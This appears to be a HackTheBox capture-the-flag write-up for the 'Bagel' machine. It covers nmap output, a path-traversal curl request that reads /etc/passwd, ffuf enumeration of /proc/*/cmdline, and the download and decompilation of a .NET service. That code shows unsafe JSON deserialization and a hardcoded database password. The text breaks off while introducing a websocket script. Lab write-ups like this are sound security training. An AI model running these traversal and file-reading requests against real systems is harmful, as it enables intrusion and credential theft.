### Bagel HackTheBox

### Difficulty = Medium

### IP Address = 10.129.157.111 

Nmap Scan:

```
# Nmap 7.92 scan initiated Sun Feb 19 00:55:22 2023 as: nmap -sCV -A -p22,5000,8000 -oN nmapscan -Pn 10.129.157.111
Nmap scan report for 10.129.157.111
Host is up (0.67s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.8 (protocol 2.0)
| ssh-hostkey: 
|   256 6e:4e:13:41:f2:fe:d9:e0:f7:27:5b:ed:ed:cc:68:c2 (ECDSA)
|_  256 80:a7:cd:10:e7:2f:db:95:8b:86:9b:1b:20:65:2a:98 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 400 Bad Request
|     Server: Microsoft-NetCore/2.0
|     Date: Sat, 18 Feb 2023 23:55:55 GMT
|     Connection: close
|   HTTPOptions: 
|     HTTP/1.1 400 Bad Request
|     Server: Microsoft-NetCore/2.0
|     Date: Sat, 18 Feb 2023 23:56:15 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html
|     Server: Microsoft-NetCore/2.0
|     Date: Sat, 18 Feb 2023 23:55:57 GMT
|     Content-Length: 54
|     Connection: close
|     Keep-Alive: true
|_    <h1>Bad Request (Invalid request line (version).)</h1>
8000/tcp open  http-alt Werkzeug/2.2.2 Python/3.10.9
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/2.2.2 Python/3.10.9
|     Date: Sat, 18 Feb 2023 23:55:55 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 263
|     Location: http://bagel.htb:8000/?page=index.html
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://bagel.htb:8000/?page=index.html">http://bagel.htb:8000/?page=index.html</a>. If not, click the link.
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.10.9
|     Date: Sat, 18 Feb 2023 23:56:18 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, HEAD, OPTIONS
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|     </html>
|   Socks5: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('
|     ').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-title: Did not follow redirect to http://bagel.htb:8000/?page=index.html
|_http-server-header: Werkzeug/2.2.2 Python/3.10.9
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5000-TCP:V=7.92%I=7%D=2/19%Time=63F1658B%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,73,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nServer:\x20Microsoft
SF:-NetCore/2\.0\r\nDate:\x20Sat,\x2018\x20Feb\x202023\x2023:55:55\x20GMT\
SF:r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,E8,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nContent-Type:\x20text/html\r\nServer:\x20Microsoft-N
SF:etCore/2\.0\r\nDate:\x20Sat,\x2018\x20Feb\x202023\x2023:55:57\x20GMT\r\
SF:nContent-Length:\x2054\r\nConnection:\x20close\r\nKeep-Alive:\x20true\r
SF:\n\r\n<h1>Bad\x20Request\x20\(Invalid\x20request\x20line\x20\(version\)
SF:\.\)</h1>")%r(HTTPOptions,73,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nSer
SF:ver:\x20Microsoft-NetCore/2\.0\r\nDate:\x20Sat,\x2018\x20Feb\x202023\x2
SF:023:56:15\x20GMT\r\nConnection:\x20close\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8000-TCP:V=7.92%I=7%D=2/19%Time=63F1658B%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,1EA,"HTTP/1\.1\x20302\x20FOUND\r\nServer:\x20Werkzeug/2\.2\.2\
SF:x20Python/3\.10\.9\r\nDate:\x20Sat,\x2018\x20Feb\x202023\x2023:55:55\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x20263\r\nLocation:\x20http://bagel\.htb:8000/\?page=index\.html\r\nCo
SF:nnection:\x20close\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\n<title
SF:>Redirecting\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x20shoul
SF:d\x20be\x20redirected\x20automatically\x20to\x20the\x20target\x20URL:\x
SF:20<a\x20href=\"http://bagel\.htb:8000/\?page=index\.html\">http://bagel
SF:\.htb:8000/\?page=index\.html</a>\.\x20If\x20not,\x20click\x20the\x20li
SF:nk\.\n")%r(Socks5,213,"<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20
SF:HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x20\x20\"http://www\.w3\.
SF:org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x20\x20<head>\n\x20\x20\x
SF:20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Content-Type\"\x20content=\
SF:"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Err
SF:or\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x20\x20\
SF:x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20<p>Message:\x20Bad\x20request\x20syntax\x20\('\\x05\\x04\
SF:\x00\\x01\\x02\\x80\\x05\\x01\\x00\\x03'\)\.</p>\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\
SF:x20-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n
SF:\x20\x20\x20\x20</body>\n</html>\n")%r(HTTPOptions,C7,"HTTP/1\.1\x20200
SF:\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\x20Python/3\.10\.9\r\nDate:\x20Sa
SF:t,\x2018\x20Feb\x202023\x2023:56:18\x20GMT\r\nContent-Type:\x20text/htm
SF:l;\x20charset=utf-8\r\nAllow:\x20GET,\x20HEAD,\x20OPTIONS\r\nContent-Le
SF:ngth:\x200\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,1F4,"<!DOCTY
SF:PE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\
SF:x20\x20\x20\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<
SF:html>\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x2
SF:0http-equiv=\"Content-Type\"\x20content=\"text/html;charset=utf-8\">\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x
SF:20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Erro
SF:r\x20code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20B
SF:ad\x20request\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST
SF:\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\
SF:n\x20\x20\x20\x20</body>\n</html>\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 19 00:58:46 2023 -- 1 IP address (1 host up) scanned in 204.17 seconds
```

From the result on 3 ports open

I'll addded `bagel.htb` to my `/etc/hosts` file

Checking out port 8000 shows a static site
![image](https://user-images.githubusercontent.com/113513376/219906749-069ee3a6-035d-4e74-933b-86bcf58680f9.png)

Noticing the url schema looks life a file inclusion taking place

I'll use curl to attempt to read the /etc/passwd file

```
└─$ curl 'http://bagel.htb:8000/?page=../../../../../../etc/passwd'                    
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
tss:x:59:59:Account used for TPM access:/dev/null:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/usr/sbin/nologin
systemd-oom:x:999:999:systemd Userspace OOM Killer:/:/usr/sbin/nologin
systemd-resolve:x:193:193:systemd Resolver:/:/usr/sbin/nologin
polkitd:x:998:997:User for polkitd:/:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
setroubleshoot:x:997:995:SELinux troubleshoot server:/var/lib/setroubleshoot:/sbin/nologin
cockpit-ws:x:996:994:User for cockpit web service:/nonexisting:/sbin/nologin
cockpit-wsinstance:x:995:993:User for cockpit-ws instances:/nonexisting:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin
chrony:x:994:992::/var/lib/chrony:/sbin/nologin
dnsmasq:x:993:991:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
systemd-coredump:x:989:989:systemd Core Dumper:/:/usr/sbin/nologin
systemd-timesync:x:988:988:systemd Time Synchronization:/:/usr/sbin/nologin
developer:x:1000:1000::/home/developer:/bin/bash
phil:x:1001:1001::/home/phil:/bin/bash
_laurel:x:987:987::/var/log/laurel:/bin/false
```

So its lfi. Since the web server is python wergzeug i'll read its app configuration file 

After few trials i got the full path of the file
![image](https://user-images.githubusercontent.com/113513376/219907027-05f90689-423d-428e-9817-eef84fe3cd4c.png)
![image](https://user-images.githubusercontent.com/113513376/219907045-ba354d49-603b-47a1-a109-9ca8c5ea31aa.png)

```
└─$ curl 'http://bagel.htb:8000/?page=../app.py'    
from flask import Flask, request, send_file, redirect, Response
import os.path
import websocket,json

app = Flask(__name__)

@app.route('/')
def index():
        if 'page' in request.args:
            page = 'static/'+request.args.get('page')
            if os.path.isfile(page):
                resp=send_file(page)
                resp.direct_passthrough = False
                if os.path.getsize(page) == 0:
                    resp.headers["Content-Length"]=str(len(resp.get_data()))
                return resp
            else:
                return "File not found"
        else:
                return redirect('http://bagel.htb:8000/?page=index.html', code=302)

@app.route('/orders')
def order(): # don't forget to run the order app first with "dotnet <path to .dll>" command. Use your ssh key to access the machine.
    try:
        ws = websocket.WebSocket()    
        ws.connect("ws://127.0.0.1:5000/") # connect to order app
        order = {"ReadOrder":"orders.txt"}
        data = str(json.dumps(order))
        ws.send(data)
        result = ws.recv()
        return(json.loads(result)['ReadOrder'])
    except:
        return("Unable to connect")

if __name__ == '__main__':
  app.run(host='0.0.0.0', port=8000)
```

Thats the web config file and from that we see that its default route is just / or orders

Route `/` is the main page which has the lfi vulnerability

While route `/orders` is a ws socket connection which is reading the value of orders.txt and sending it to the remote server

If you notice the comment it says 

```
Don't forget to run the order app first with "dotnet <path to .dll>" command. Use your ssh key to access the machine.
```

So there's a process running on the machine and its a dll file 

I can attempt to fuzz for process running using its pid `/proc/FUZZ/cmdline` 

I will create a wordlist which i'll use for the fuzzing of numbers from 1 to 2000

Then use ffuf to fuzz for valid pids

```
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Bagel]
└─$ for i in $(seq 1 2000); do echo $i; done > proclist
                                                                                               
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Bagel]
└─$ wc -l proclist 
2000 proclist
                                                                                               
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Bagel]
└─$ ffuf -c -u 'http://bagel.htb:8000/?page=../../../../../../proc/FUZZ/cmdline' -w proclist -fs 0,14   

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://bagel.htb:8000/?page=../../../../../../proc/FUZZ/cmdline
 :: Wordlist         : FUZZ: proclist
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 0,14
________________________________________________

1                       [Status: 200, Size: 72, Words: 1, Lines: 1, Duration: 136ms]
762                     [Status: 200, Size: 34, Words: 1, Lines: 1, Duration: 149ms]
775                     [Status: 200, Size: 31, Words: 1, Lines: 1, Duration: 146ms]
854                     [Status: 200, Size: 34, Words: 1, Lines: 1, Duration: 154ms]
853                     [Status: 200, Size: 30, Words: 1, Lines: 1, Duration: 153ms]
859                     [Status: 200, Size: 56, Words: 1, Lines: 1, Duration: 138ms]
856                     [Status: 200, Size: 13, Words: 1, Lines: 1, Duration: 138ms]
855                     [Status: 200, Size: 33, Words: 1, Lines: 1, Duration: 136ms]
857                     [Status: 200, Size: 13, Words: 1, Lines: 1, Duration: 138ms]
858                     [Status: 200, Size: 21, Words: 1, Lines: 1, Duration: 142ms]
860                     [Status: 200, Size: 13, Words: 1, Lines: 1, Duration: 144ms]
888                     [Status: 200, Size: 37, Words: 1, Lines: 1, Duration: 137ms]
891                     [Status: 200, Size: 37, Words: 1, Lines: 1, Duration: 142ms]
893                     [Status: 200, Size: 45, Words: 1, Lines: 1, Duration: 136ms]
895                     [Status: 200, Size: 35, Words: 1, Lines: 1, Duration: 145ms]
898                     [Status: 200, Size: 37, Words: 1, Lines: 1, Duration: 163ms]
896                     [Status: 200, Size: 34, Words: 1, Lines: 1, Duration: 163ms]
899                     [Status: 200, Size: 34, Words: 1, Lines: 1, Duration: 155ms]
897                     [Status: 200, Size: 39, Words: 1, Lines: 1, Duration: 163ms]
901                     [Status: 200, Size: 23, Words: 1, Lines: 1, Duration: 134ms]
905                     [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 152ms]
908                     [Status: 200, Size: 18, Words: 1, Lines: 1, Duration: 153ms]
907                     [Status: 200, Size: 26, Words: 1, Lines: 1, Duration: 154ms]
906                     [Status: 200, Size: 32, Words: 1, Lines: 1, Duration: 154ms]
910                     [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 135ms]
912                     [Status: 200, Size: 37, Words: 1, Lines: 1, Duration: 138ms]
911                     [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 140ms]
916                     [Status: 200, Size: 51, Words: 1, Lines: 1, Duration: 149ms]
919                     [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 150ms]
925                     [Status: 200, Size: 147, Words: 1, Lines: 1, Duration: 134ms]
926                     [Status: 200, Size: 45, Words: 1, Lines: 1, Duration: 136ms]
923                     [Status: 200, Size: 45, Words: 1, Lines: 1, Duration: 145ms]
927                     [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 152ms]
924                     [Status: 200, Size: 45, Words: 1, Lines: 1, Duration: 155ms]
929                     [Status: 200, Size: 45, Words: 1, Lines: 1, Duration: 153ms]
930                     [Status: 200, Size: 45, Words: 1, Lines: 1, Duration: 155ms]
922                     [Status: 200, Size: 45, Words: 1, Lines: 1, Duration: 161ms]
931                     [Status: 200, Size: 45, Words: 1, Lines: 1, Duration: 158ms]
933                     [Status: 200, Size: 37, Words: 1, Lines: 1, Duration: 167ms]
935                     [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 131ms]
932                     [Status: 200, Size: 37, Words: 1, Lines: 1, Duration: 169ms]
941                     [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 140ms]
943                     [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 145ms]
945                     [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 124ms]
944                     [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 142ms]
942                     [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 153ms]
946                     [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 150ms]
947                     [Status: 200, Size: 56, Words: 8, Lines: 1, Duration: 154ms]
948                     [Status: 200, Size: 37, Words: 1, Lines: 1, Duration: 147ms]
949                     [Status: 200, Size: 37, Words: 1, Lines: 1, Duration: 142ms]
950                     [Status: 200, Size: 44, Words: 1, Lines: 1, Duration: 143ms]
952                     [Status: 200, Size: 38, Words: 1, Lines: 1, Duration: 124ms]
951                     [Status: 200, Size: 38, Words: 1, Lines: 1, Duration: 130ms]
957                     [Status: 200, Size: 18, Words: 1, Lines: 1, Duration: 137ms]
955                     [Status: 200, Size: 18, Words: 1, Lines: 1, Duration: 138ms]
962                     [Status: 200, Size: 18, Words: 1, Lines: 1, Duration: 136ms]
975                     [Status: 200, Size: 37, Words: 1, Lines: 1, Duration: 176ms]
992                     [Status: 200, Size: 23, Words: 1, Lines: 1, Duration: 132ms]
1024                    [Status: 200, Size: 23, Words: 1, Lines: 1, Duration: 171ms]
1029                    [Status: 200, Size: 23, Words: 1, Lines: 1, Duration: 128ms]
1032                    [Status: 200, Size: 23, Words: 1, Lines: 1, Duration: 153ms]
1036                    [Status: 200, Size: 45, Words: 1, Lines: 1, Duration: 153ms]
1039                    [Status: 200, Size: 45, Words: 1, Lines: 1, Duration: 159ms]
1041                    [Status: 200, Size: 45, Words: 1, Lines: 1, Duration: 162ms]
1053                    [Status: 200, Size: 17, Words: 1, Lines: 1, Duration: 172ms]
1054                    [Status: 200, Size: 19, Words: 1, Lines: 1, Duration: 183ms]
1071                    [Status: 200, Size: 43, Words: 3, Lines: 1, Duration: 140ms]
:: Progress: [2000/2000] :: Job [1/1] :: 135 req/sec :: Duration: [0:00:15] :: Errors: 0 ::
```

Now i have all process i'll save it in a file then use `cut` to get only the numbers

```
┌──(mark㉿haxor)-[~/…/B2B/HTB/Bagel/proc]
└─$ cat validproc| cut -d ' ' -f 1 > process.txt

┌──(mark㉿haxor)-[~/…/B2B/HTB/Bagel/proc]
└─$ wc -l process.txt 
67 process.txt
```

I can literally start going through each process manually but automating it will be more beneficial

Here's my script which i used to read each process from the process.txt then does curl on /proc/{num}/cmdline then saves the output in a file [Solve](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/htb/b2b/bagel/fuzz.py)

Running it works

```
└─$ python3 getallproc.py 
                                                                                                                     
┌──(mark㉿haxor)-[~/…/B2B/HTB/Bagel/proc]
└─$ wc -l output.txt 
67 output.txt
```

Checking the output.txt file reveals the full path to the .dll file which we're finding

```
/usr/lib/systemd/systemdrhgb--switched-root--system--deserialize351
/usr/lib/systemd/systemd-journald762
/usr/lib/systemd/systemd-udevd775
/usr/lib/systemd/systemd-resolved854
/usr/lib/systemd/systemd-oomd853
/usr/local/sbin/laurel--config/etc/laurel/config.toml859
/sbin/auditd856
/usr/lib/systemd/systemd-userdbd855
/sbin/auditd857
/usr/sbin/sedispatch858
/sbin/auditd860
/usr/sbin/NetworkManager--no-daemon888
/usr/sbin/NetworkManager--no-daemon891
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll893
python3/home/developer/app/app.py895
/usr/lib/polkit-1/polkitd--no-debug898
/usr/sbin/irqbalance--foreground896
/usr/sbin/irqbalance--foreground899
/usr/sbin/mcelog--daemon--foreground897
/usr/sbin/chronyd-F2901
/usr/sbin/rsyslogd-n905
/usr/bin/vmtoolsd908
/usr/bin/VGAuthService-s907
/usr/lib/systemd/systemd-logind906
/usr/sbin/rsyslogd-n910
/usr/lib/polkit-1/polkitd--no-debug912
/usr/sbin/abrtd-d-s911
/usr/bin/dbus-broker-launch--scopesystem--audit916
/usr/sbin/rsyslogd-n919
dbus-broker--log4--controller9--machine-idce8a2667e5384602a9b46d6ad7614e92--max-bytes536870912--max-fds4096--max-matches131072--audit925
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll926
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll923
/usr/sbin/abrtd-d-s927
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll924
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll929
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll930
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll922
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll931
/usr/lib/polkit-1/polkitd--no-debug933
/usr/sbin/abrtd-d-s935
/usr/sbin/NetworkManager--no-daemon932
/usr/sbin/gssproxy-D941
/usr/sbin/gssproxy-D943
/usr/sbin/gssproxy-D945
/usr/sbin/gssproxy-D944
/usr/sbin/gssproxy-D942
/usr/sbin/gssproxy-D946
sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups947
/usr/lib/polkit-1/polkitd--no-debug948
/usr/lib/polkit-1/polkitd--no-debug949
/usr/bin/abrt-dump-journal-core-D-T-f-e950
/usr/bin/abrt-dump-journal-xorg-fxtD952
/usr/bin/abrt-dump-journal-oops-fxtD951
/usr/bin/vmtoolsd957
/usr/bin/vmtoolsd955
/usr/bin/vmtoolsd962
/usr/lib/polkit-1/polkitd--no-debug975
/usr/sbin/ModemManager992
/usr/sbin/ModemManager1024
/usr/sbin/ModemManager1029
/usr/sbin/ModemManager1032
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll1036
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll1039
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll1041
/usr/sbin/atd-f1053
/usr/sbin/crond-n1054
/sbin/agetty-o-p -- \u--noclear-linux1071
```

Here's the full path `/opt/bagel/bin/Debug/net6.0/bagel.dll`

Using the lfi i can get the content of the bagel.dll file

```
└─$ curl 'http://bagel.htb:8000/?page=../../../../../../opt/bagel/bin/Debug/net6.0/bagel.dll' -o bagel.dll  
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 10752  100 10752    0     0  37356      0 --:--:-- --:--:-- --:--:-- 37463
                                                                                                                     
┌──(mark㉿haxor)-[~/…/B2B/HTB/Bagel/proc]
└─$ file bagel.dll                                                                                    
bagel.dll: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
```

Now i'll use dnspy to view the decompiled file
![image](https://user-images.githubusercontent.com/113513376/219908077-be1b6bd8-ad2a-4218-9306-625c59c73561.png)

Here's the decompiled file function. And what it basically does is to read the content of `orders.txt` in `/opt/bagel/orders/`

```
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;

namespace bagel_server
{
	// Token: 0x02000009 RID: 9
	[NullableContext(1)]
	[Nullable(0)]
	public class File
	{
		// Token: 0x17000007 RID: 7
		// (get) Token: 0x0600001C RID: 28 RVA: 0x00002400 File Offset: 0x00000600
		// (set) Token: 0x0600001B RID: 27 RVA: 0x000023DD File Offset: 0x000005DD
		public string ReadFile
		{
			get
			{
				return this.file_content;
			}
			set
			{
				this.filename = value;
				this.ReadContent(this.directory + this.filename);
			}
		}

		// Token: 0x0600001D RID: 29 RVA: 0x00002418 File Offset: 0x00000618
		public void ReadContent(string path)
		{
			try
			{
				IEnumerable<string> values = File.ReadLines(path, Encoding.UTF8);
				this.file_content += string.Join("\n", values);
			}
			catch (Exception ex)
			{
				this.file_content = "Order not found!";
			}
		}

		// Token: 0x17000008 RID: 8
		// (get) Token: 0x0600001E RID: 30 RVA: 0x00002474 File Offset: 0x00000674
		// (set) Token: 0x0600001F RID: 31 RVA: 0x0000248C File Offset: 0x0000068C
		public string WriteFile
		{
			get
			{
				return this.IsSuccess;
			}
			set
			{
				this.WriteContent(this.directory + this.filename, value);
			}
		}

		// Token: 0x06000020 RID: 32 RVA: 0x000024A8 File Offset: 0x000006A8
		public void WriteContent(string filename, string line)
		{
			try
			{
				File.WriteAllText(filename, line);
				this.IsSuccess = "Operation successed";
			}
			catch (Exception ex)
			{
				this.IsSuccess = "Operation failed";
			}
		}

		// Token: 0x0400000D RID: 13
		private string file_content;

		// Token: 0x0400000E RID: 14
		private string IsSuccess = null;

		// Token: 0x0400000F RID: 15
		private string directory = "/opt/bagel/orders/";

		// Token: 0x04000010 RID: 16
		private string filename = "orders.txt";
	}
}
```

Looking through the order function shows a possible lfi filter which prevents the input passed from having `.. and &`

```
using System;
using System.Runtime.CompilerServices;

namespace bagel_server
{
	// Token: 0x02000008 RID: 8
	[NullableContext(1)]
	[Nullable(0)]
	public class Orders
	{
		// Token: 0x17000004 RID: 4
		// (get) Token: 0x06000014 RID: 20 RVA: 0x000022FF File Offset: 0x000004FF
		// (set) Token: 0x06000015 RID: 21 RVA: 0x00002307 File Offset: 0x00000507
		public object RemoveOrder { get; set; }

		// Token: 0x17000005 RID: 5
		// (get) Token: 0x06000016 RID: 22 RVA: 0x00002310 File Offset: 0x00000510
		// (set) Token: 0x06000017 RID: 23 RVA: 0x0000232D File Offset: 0x0000052D
		public string WriteOrder
		{
			get
			{
				return this.file.WriteFile;
			}
			set
			{
				this.order_info = value;
				this.file.WriteFile = this.order_info;
			}
		}

		// Token: 0x17000006 RID: 6
		// (get) Token: 0x06000018 RID: 24 RVA: 0x0000234C File Offset: 0x0000054C
		// (set) Token: 0x06000019 RID: 25 RVA: 0x0000236C File Offset: 0x0000056C
		public string ReadOrder
		{
			get
			{
				return this.file.ReadFile;
			}
			set
			{
				this.order_filename = value;
				this.order_filename = this.order_filename.Replace("/", "");
				this.order_filename = this.order_filename.Replace("..", "");
				this.file.ReadFile = this.order_filename;
			}
		}

		// Token: 0x04000009 RID: 9
		private string order_filename;

		// Token: 0x0400000A RID: 10
		private string order_info;

		// Token: 0x0400000B RID: 11
		private File file = new File();
	}
}
```
![image](https://user-images.githubusercontent.com/113513376/219908198-5c298ccc-ce4e-4755-ac44-9016287dc117.png)

The handler function seems to be performing some sort of deserialization on the json data passed

```
using System;
using System.Runtime.CompilerServices;
using Newtonsoft.Json;

namespace bagel_server
{
	// Token: 0x02000005 RID: 5
	[NullableContext(1)]
	[Nullable(0)]
	public class Handler
	{
		// Token: 0x06000005 RID: 5 RVA: 0x00002094 File Offset: 0x00000294
		public object Serialize(object obj)
		{
			return JsonConvert.SerializeObject(obj, 1, new JsonSerializerSettings
			{
				TypeNameHandling = 4
			});
		}

		// Token: 0x06000006 RID: 6 RVA: 0x000020BC File Offset: 0x000002BC
		public object Deserialize(string json)
		{
			object result;
			try
			{
				result = JsonConvert.DeserializeObject<Base>(json, new JsonSerializerSettings
				{
					TypeNameHandling = 4
				});
			}
			catch
			{
				result = "{\"Message\":\"unknown\"}";
			}
			return result;
		}
	}
}
```
![image](https://user-images.githubusercontent.com/113513376/219908211-8d24d63b-361e-49a1-a69a-d7d36635a278.png)

The DB function has a database connection credential `dev:k8wdAYYKyhnjg3K` `# doesn't work on ssh :(`

```
using System;
using Microsoft.Data.SqlClient;

namespace bagel_server
{
	// Token: 0x0200000A RID: 10
	public class DB
	{
		// Token: 0x06000022 RID: 34 RVA: 0x00002518 File Offset: 0x00000718
		[Obsolete("The production team has to decide where the database server will be hosted. This method is not fully implemented.")]
		public void DB_connection()
		{
			string text = "Data Source=ip;Initial Catalog=Orders;User ID=dev;Password=k8wdAYYKyhnjg3K";
			SqlConnection sqlConnection = new SqlConnection(text);
		}
	}
}
```
![image](https://user-images.githubusercontent.com/113513376/219908250-66ea637b-21d3-4e76-b9d7-2f0f2f451f22.png)

With this, we can tell that this is likely going to be the binary the ws socket uses or is made to do

Using chatgpt it made a script which will help me connect to the ws socket server

Here's the script [WSCONNECT](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/htb/b2b/bagel/wsconnect.py)

This is the information used to make the script (the second route of the web server)

```
@app.route('/orders')
def order(): # don't forget to run the order app first with "dotnet <paath to .dll>" commnd. Use your ssh key to access the machine.
    try:
